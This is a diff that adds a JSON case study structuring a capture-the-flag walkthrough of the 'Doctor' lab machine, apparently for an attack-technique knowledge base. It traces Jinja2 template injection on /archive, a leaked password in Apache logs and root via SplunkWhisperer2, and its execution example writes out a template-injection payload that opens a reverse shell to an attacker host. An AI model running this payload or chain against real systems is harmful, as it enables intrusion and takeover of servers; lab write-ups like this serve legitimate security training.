@@ -1,0 +1,129 @@
+{
+  "artifacts": [
+    {
+      "draft_type": "case",
+      "artifact_type": "case",
+      "knowledge_role": "case_study",
+      "local_id": "case-doctor",
+      "origin": "explicit",
+      "title": "Flask SSTI via /archive to SplunkWhisperer2 root (Doctor)",
+      "starting_access": "unauthenticated access to a Flask messaging app and Splunk on an Ubuntu 20.04 host",
+      "source_quality": "complete",
+      "difficulty": "medium",
+      "outcome": "root via Splunk admin credentials and SplunkWhisperer2",
+      "transferable_properties": [
+        "HTML comments hide active endpoints",
+        "SSTI doesn't always trigger on the main view, test every rendering context",
+        "the Linux adm group grants read access to system logs, a privesc goldmine",
+        "Splunk running as root with valid admin credentials is an instant root",
+        "password reuse across services"
+      ],
+      "non_transferable_properties": [],
+      "steps": [
+        {
+          "artifact_type": "case_step",
+          "local_id": "step-1",
+          "ordinal": 1,
+          "state_before": {
+            "access": "unauthenticated",
+            "environment": ["Apache 2.4.41", "Flask messaging app", "Splunk 8089"],
+            "privileges": []
+          },
+          "observations": ["ports 22/80/8089 open", "doctors.htb Flask app with registration", "/archive endpoint renders titles without escaping"],
+          "hypotheses": [{"statement": "the /archive endpoint is vulnerable to Jinja2 SSTI", "origin": "inferred"}],
+          "selected_action": {"intent": "register, post a title with an SSTI payload, and check /archive"},
+          "evidence": [{"summary": "confirmed Jinja2 SSTI when {{7*7}} rendered as 49 in /archive", "origin": "explicit", "category": "recon"}],
+          "state_after": {
+            "access": "authenticated web app",
+            "environment": ["SSTI on /archive"],
+            "privileges": []
+          },
+          "origin": "explicit",
+          "citations": [{"segment_indexes": [1, 2, 3]}]
+        },
+        {
+          "artifact_type": "case_step",
+          "local_id": "step-2",
+          "ordinal": 2,
+          "state_before": {
+            "access": "authenticated web app",
+            "environment": ["SSTI on /archive"],
+            "privileges": []
+          },
+          "observations": ["SSTI gives RCE via os.popen", "shell runs as web, member of adm group"],
+          "hypotheses": [{"statement": "RCE lets us spawn a reverse shell as web", "origin": "inferred"}],
+          "selected_action": {"intent": "use the SSTI to run a reverse shell payload"},
+          "evidence": [{"summary": "got a reverse shell as web via the SSTI os.popen payload", "origin": "explicit", "category": "exploitation"}],
+          "state_after": {
+            "access": "shell as web",
+            "environment": [],
+            "privileges": ["web", "adm"]
+          },
+          "origin": "explicit",
+          "citations": [{"segment_indexes": [3]}]
+        },
+        {
+          "artifact_type": "case_step",
+          "local_id": "step-3",
+          "ordinal": 3,
+          "state_before": {
+            "access": "shell as web",
+            "environment": [],
+            "privileges": ["web", "adm"]
+          },
+          "observations": ["no sudo", "adm group reads /var/log", "an Apache backup log contains a password in a URL parameter"],
+          "hypotheses": [{"statement": "a leaked password in the logs grants lateral movement to shaun", "origin": "inferred"}],
+          "selected_action": {"intent": "grep the logs for credentials and try them over su"},
+          "evidence": [{"summary": "found Guitar123 in an Apache backup log and used it to su to shaun", "origin": "explicit", "category": "lateral_movement"}],
+          "state_after": {
+            "access": "shell as shaun",
+            "environment": [],
+            "privileges": ["shaun"]
+          },
+          "origin": "explicit",
+          "citations": [{"segment_indexes": [4]}]
+        },
+        {
+          "artifact_type": "case_step",
+          "local_id": "step-4",
+          "ordinal": 4,
+          "state_before": {
+            "access": "shell as shaun",
+            "environment": [],
+            "privileges": ["shaun"]
+          },
+          "observations": ["shaun's credentials work on Splunk admin", "Splunk runs as root on 8089"],
+          "hypotheses": [{"statement": "SplunkWhisperer2 with admin credentials deploys a scripted input that runs as root", "origin": "inferred"}],
+          "selected_action": {"intent": "use SplunkWhisperer2 to deploy a malicious app and get a root shell"},
+          "evidence": [{"summary": "ran SplunkWhisperer2 with shaun's admin credentials and obtained a root reverse shell", "origin": "explicit", "category": "privilege_escalation"}],
+          "state_after": {
+            "access": "root shell",
+            "environment": [],
+            "privileges": ["root"]
+          },
+          "origin": "explicit",
+          "citations": [{"segment_indexes": [4]}]
+        }
+      ],
+      "citations": [{"segment_indexes": [0, 1, 2, 3, 4]}]
+    }
+  ],
+  "execution_examples": [
+    {
+      "local_id": "ex-doctor-1",
+      "parent_local_id": "step-2",
+      "command_template": "{{config.__class__.__init__.__globals__['os'].popen('bash -c \\\"bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\\\"').read()}}",
+      "placeholders": [
+        {"name": "lhost", "kind": "value", "binding_policy": "host_supplied", "role": "attacker IP for the reverse shell"},
+        {"name": "lport", "kind": "port", "binding_policy": "host_supplied", "role": "attacker port for the reverse shell"}
+      ],
+      "capability_hint": "Jinja2 SSTI RCE to spawn a reverse shell via os.popen",
+      "purpose": "initial access via server-side template injection in the /archive endpoint",
+      "observed_role": "authenticated web app user",
+      "prerequisites": [{"statement": "the /archive endpoint renders the post title without escaping", "citations": [{"segment_indexes": [3]}]}],
+      "platform_constraints": [{"dimension": "os_family", "relation": "required", "value": "linux", "citations": [{"segment_indexes": [3]}]}],
+      "citations": [{"segment_indexes": [3]}]
+    }
+  ],
+  "ignored_segment_indexes": [5, 6, 7]
+}
